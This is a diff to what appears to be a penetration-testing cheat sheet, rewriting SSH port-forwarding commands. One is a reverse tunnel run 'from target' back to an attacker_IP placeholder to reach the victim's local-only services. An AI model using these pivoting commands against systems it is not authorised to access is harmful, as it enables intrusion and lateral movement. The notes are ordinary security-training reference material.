@@ -3982,14 +3982,14 @@ ssh -i private_key user@IP_here
 # create key pair
 ssh-keygen
 
-# port forwarding
-ssh -N -L local_port_to_forward_from:IP_here:port_to_forward_to
+# local port forwarding through proxy - opens port on localhost + forwards it to remote target, run from attacker box
+ssh -N -L local_port_to_forward_from:target_IP_here:target_port_to_forward_to user@proxy_IP_here
 
-# port forwarding / tunnel through proxy
-ssh -N -L 0.0.0.0:local_port_to_forward_from:target_IP_here:target_port_to_forward_to user@proxy_IP_here
+# remote port forwarding through proxy - opens port on remote target + forwards it to localhost, run from target
+ssh -N -R local_attacker_IP_here:local_attacker_port_here:127.0.0.1:target_port_here username_here@attacker_IP_here
 
-# port forwarding - forward to victim via ssh to get access to services listening on localhost
-ssh -R local_attacker_port_here:127.0.0.1:target_port_here username_here@local_attacker_machine_here
+# dynamic port forwarding
+ssh -N -D 127.0.0.1:local_port_to_forward_from user@proxy_IP_here
 
 # key exchange error
 ssh -oKexAlgorithms=proposed_algorithm_here user@IP_here
